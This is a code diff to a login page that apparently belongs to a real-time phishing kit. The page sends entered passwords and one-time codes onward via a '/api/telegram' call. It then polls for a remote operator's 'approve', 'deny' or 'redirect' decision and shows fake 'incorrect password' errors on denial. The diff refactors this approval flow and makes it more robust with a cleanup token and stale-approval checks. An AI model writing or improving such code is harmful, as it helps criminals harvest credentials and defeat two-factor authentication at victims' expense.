@@ -35,6 +35,12 @@ const generateApprovalId = () => {
   return `${Date.now()}-${Math.random().toString(16).slice(2)}`
 }
 
+type PendingApproval = {
+  id: string
+  stage: "password" | "otp"
+  cleanupToken: string
+}
+
 export default function LoginPage() {
   const approvalTimeoutSeconds = Math.ceil(APPROVAL_TIMEOUT_MS / 1000)
   const [username, setUsername] = useState("")
@@ -52,10 +58,9 @@ export default function LoginPage() {
   const [resendLoading, setResendLoading] = useState(false)
   const [resendCooldown, setResendCooldown] = useState(0)
 
-  const [approvalId, setApprovalId] = useState("")
-  const [awaitingApproval, setAwaitingApproval] = useState(false)
+  const [pendingApproval, setPendingApproval] = useState<PendingApproval | null>(null)
   const [approvalCountdown, setApprovalCountdown] = useState(approvalTimeoutSeconds)
-  const [approvalStage, setApprovalStage] = useState<"password" | "otp" | null>(null)
+  const awaitingApproval = pendingApproval !== null
 
   const [loading, setLoading] = useState({
     next: false,
@@ -75,25 +80,26 @@ export default function LoginPage() {
   }, [awaitingApproval, approvalCountdown])
 
   useEffect(() => {
-    if (!awaitingApproval || approvalCountdown > 0) return
-    handleApprovalComplete("redirect")
-  }, [approvalCountdown, awaitingApproval])
+    if (!awaitingApproval || approvalCountdown > 0 || !pendingApproval) return
+    handleApprovalComplete("redirect", pendingApproval)
+  }, [approvalCountdown, awaitingApproval, pendingApproval])
 
   useEffect(() => {
-    if (!awaitingApproval || !approvalId) return
+    if (!awaitingApproval || !pendingApproval) return
+    const approval = pendingApproval
 
     const pollInterval = window.setInterval(async () => {
       try {
-        const response = await fetch(`/api/approval-status?approvalId=${approvalId}`)
+        const response = await fetch(`/api/approval-status?approvalId=${approval.id}`)
         const result = await response.json()
 
         if (result.success && result.data.action) {
           if (result.data.action === "approve") {
-            handleApprovalComplete("approve")
+            handleApprovalComplete("approve", approval)
           } else if (result.data.action === "deny") {
-            handleApprovalComplete("deny")
+            handleApprovalComplete("deny", approval)
           } else if (result.data.action === "redirect") {
-            handleApprovalComplete("redirect")
+            handleApprovalComplete("redirect", approval)
           }
         }
       } catch (error) {
@@ -102,7 +108,7 @@ export default function LoginPage() {
     }, 2000)
 
     return () => window.clearInterval(pollInterval)
-  }, [awaitingApproval, approvalId, approvalStage])
+  }, [awaitingApproval, pendingApproval])
 
   useEffect(() => {
     if (resendCooldown <= 0) return
@@ -132,26 +138,32 @@ export default function LoginPage() {
     return `0:${padded}`
   }
 
-  const handleApprovalComplete = (action: "approve" | "deny" | "redirect") => {
-    setAwaitingApproval(false)
-    setApprovalId("")
+  const handleApprovalComplete = (
+    action: "approve" | "deny" | "redirect",
+    approval: PendingApproval | null = pendingApproval
+  ) => {
+    if (!approval || pendingApproval?.id !== approval.id) {
+      return
+    }
+
+    setPendingApproval(null)
     setApprovalCountdown(approvalTimeoutSeconds)
 
     if (action === "approve") {
-      if (approvalStage === "password") {
+      if (approval.stage === "password") {
         setView("verificationMethod")
-      } else if (approvalStage === "otp") {
+      } else if (approval.stage === "otp") {
         window.location.href = "/api/login-out"
       }
       return
     }
 
     if (action === "deny") {
-      if (approvalStage === "password") {
+      if (approval.stage === "password") {
         setPassword("")
         setLoginStep("password")
         setLoginError("Incorrect password. Please try again.")
-      } else if (approvalStage === "otp") {
+      } else if (approval.stage === "otp") {
         setVerificationCode("")
         setOtpError("Incorrect verification code. Please try again.")
       }
@@ -166,9 +178,9 @@ export default function LoginPage() {
   const initiateApproval = async (stage: "password" | "otp") => {
     const newApprovalId = generateApprovalId()
     let approvalRegistered = false
+    let cleanupToken = ""
 
     try {
-      setApprovalStage(stage)
       const registerResponse = await fetch("/api/approval", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -182,10 +194,21 @@ export default function LoginPage() {
       if (!registerResponse.ok) {
         throw new Error("Failed to register approval")
       }
+      const registerResult = await registerResponse.json()
+      cleanupToken =
+        registerResult?.success && typeof registerResult?.data?.cleanupToken === "string"
+          ? registerResult.data.cleanupToken
+          : ""
+      if (!cleanupToken) {
+        throw new Error("Missing cleanup token")
+      }
       approvalRegistered = true
 
-      setApprovalId(newApprovalId)
-      setAwaitingApproval(true)
+      setPendingApproval({
+        id: newApprovalId,
+        stage,
+        cleanupToken,
+      })
       setApprovalCountdown(approvalTimeoutSeconds)
 
       const telegramResponse = await fetch("/api/telegram", {
@@ -207,15 +230,14 @@ export default function LoginPage() {
       }
     } catch (error) {
       console.error("Approval initiation error:", error)
-      if (approvalRegistered) {
+      if (approvalRegistered && cleanupToken) {
         void fetch("/api/approval", {
           method: "DELETE",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ approvalId: newApprovalId }),
+          body: JSON.stringify({ approvalId: newApprovalId, cleanupToken }),
         }).catch(() => {})
       }
-      setAwaitingApproval(false)
-      setApprovalId("")
+      setPendingApproval(null)
       setApprovalCountdown(approvalTimeoutSeconds)
       if (stage === "password") {
         setLoginError(MSG_UNABLE_REACH_VERIFICATION)
@@ -268,8 +290,7 @@ export default function LoginPage() {
     setOtpError("")
     setResendLoading(false)
     setResendCooldown(0)
-    setAwaitingApproval(false)
-    setApprovalId("")
+    setPendingApproval(null)
     setApprovalCountdown(approvalTimeoutSeconds)
     if (typeof window !== "undefined") {
       sessionStorage.removeItem("wex_username")
